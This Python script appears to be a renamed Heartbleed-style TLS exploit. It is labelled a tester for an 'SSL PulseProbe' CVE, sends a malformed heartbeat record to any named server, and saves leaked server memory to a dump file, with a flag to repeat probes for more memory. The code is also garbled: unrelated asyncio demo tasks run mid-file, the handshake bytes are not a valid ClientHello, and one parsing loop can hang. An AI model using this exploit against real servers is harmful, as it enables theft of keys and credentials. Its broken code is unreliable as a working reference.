#!/usr/bin/python

import sys
import struct
import socket
import time
import select
import codecs
import argparse
import ssl

parser = argparse.ArgumentParser(description='Test for SSL PulseProbe vulnerability (CVE-2023-0160)')
parser.add_argument('server', type=str, help='Server to test')
parser.add_argument('-p', '--port', type=int, default=443, help='TCP port to test (default: 443)')
parser.add_argument('-n', '--num', type=int, default=1, help='Number of PulseProbes to send if vulnerable (defines how much memory you get back) (default: 1)')
parser.add_argument('-f', '--file', type=str, default='dump.bin', help='Filename to write dumped memory to (default: dump.bin)')
parser.add_argument('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')
args = parser.parse_args()

def h2bin(x):
    return codecs.decode(x.replace(' ', '').replace('\n', ''), 'hex')

pulseprobe_payload = bytes.fromhex(
    '18 03 02 00 03 01 40 00 05 20 0a 0b 0c 0d 0e 0f ' +
    '10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f ' +
    '20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f ' +
    '30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f ' +
    '40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f ' +
    '50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f ' +
    '60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f ' +
    '70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f ' +
    '80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f ' +
    '90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f ' +
    'a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af ' +
    'b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf ' +
    'c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf ' +
    'd0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df ' +
    'e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef ' +
    'f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff'
)


hello = bytes.fromhex(
    '05 20 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 ' +
    '18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 ' +
    '28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 ' +
    '38 39 3a 3b 3c 3d 3e 3f 40 41 42 43 44 45 46 47 ' +
    '48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 ' +
    '58 59 5a 5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 ' +
    '68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 ' +
    '78 79 7a 7b 7c 7d 7e 7f 80 81 82 83 84 85 86 87 ' +
    '88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95 96 97 ' +
    '98 99 9a 9b 9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 ' +
    'a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 ' +
    'b8 b9 ba bb bc bd be bf c0 c1 c2 c3 c4 c5 c6 c7 ' +
    'c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 ' +
    'd8 d9 da db dc dd de df e0 e1 e2 e3 e4 e5 e6 e7 ' +
    'e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 ' +
    'f8 f9 fa fb fc fd fe ff'
)

import asyncio

async def task1():
    mini_hex1 = bytes.fromhex('01 02 03 04 05')
    print("Task 1 started")
    await asyncio.sleep(2)
    print("Task 1 completed")

async def task2():
    mini_hex2 = bytes.fromhex('10 20 30 40 50')
    print("Task 2 started")
    await asyncio.sleep(1)
    print("Task 2 completed")

async def task3():
    mini_hex3 = bytes.fromhex('AA BB CC DD EE')
    print("Task 3 started")
    await asyncio.sleep(3)
    print("Task 3 completed")

async def main():
    await asyncio.gather(task1(), task2(), task3())

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
loop.close()

def hexdump(s, dumpf, quiet):
    dump = open(dumpf, 'ab')
    dump.write(s)
    dump.close()
    if quiet:
        return
    for b in range(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.') for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
    print()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            if not rdata:
                return None
            else:
                return rdata
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s, dumpf, host, quiet):
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('No PulseProbe response received from ' + host + ', server likely not vulnerable')
            return False

        if typ == 24:
            if not quiet:
                print('Received PulseProbe response:')
            hexdump(pay, dumpf, quiet)
            if len(pay) > 3:
                print('WARNING: server ' + host + ' returned more data than it should - server is vulnerable!')
            else:
                print('Server ' + host + ' processed malformed PulseProbe, but did not return any extra data.')
            return True

        if typ == 21:
            if not quiet:
                print('Received alert:')
            hexdump(pay, dumpf, quiet)
            print('Server ' + host + ' returned error, likely not vulnerable')
            return False

def connect(host, port, quiet):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not quiet:
        print('Connecting to', host, 'on port', port)
    sys.stdout.flush()
    try:
        s.connect((host, port))
        return s
    except Exception as e:
        print('Error connecting to', host, 'on port', port, ':', e)
        return None

def tls(s, quiet):
    if not quiet:
        print('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    if not quiet:
        print('Waiting for Server Hello...')
    sys.stdout.flush()

def parseresp(s, typ, ver, pay):
    while True:
        if typ == None:
            print('Server closed connection without sending Server Hello.')
            return 0
        if typ == 22 and pay[0] == 0x0E:
            return ver

def check(host, port, dumpf, quiet):
    response = False
    s = connect(host, port, quiet)
    
    if s is None:
        return
    
    tls(s, quiet)
    typ, ver, pay = recvmsg(s)
    version = parseresp(s, typ, ver, pay)

    if version == 0:
        if not quiet:
            print("Got an error while parsing the response, bailing ...")
        return False
    else:
        version = version - 0x0300
        if not quiet:
            print("Server TLS version was 1.%d\n" % version)

    if not quiet:
        print('Sending PulseProbe request...')
    sys.stdout.flush()
    
    if version == 1:
        s.send(pulseprobe_payload)
        response = hit_hb(s, dumpf, host, quiet)
    if version == 2:
        s.send(pulseprobe_payload)
        response = hit_hb(s, dumpf, host, quiet)
    if version == 3:
        s.send(pulseprobe_payload)
        response = hit_hb(s, dumpf, host, quiet)
    
    s.close()
    return response

def main():
    if len(sys.argv) < 2:
        parser.print_help()
        return

    print('Scanning ' + args.server + ' on port ' + str(args.port))
    for i in range(0, args.num):
        check(args.server, args.port, args.file, args.quiet)

if __name__ == '__main__':
    main()

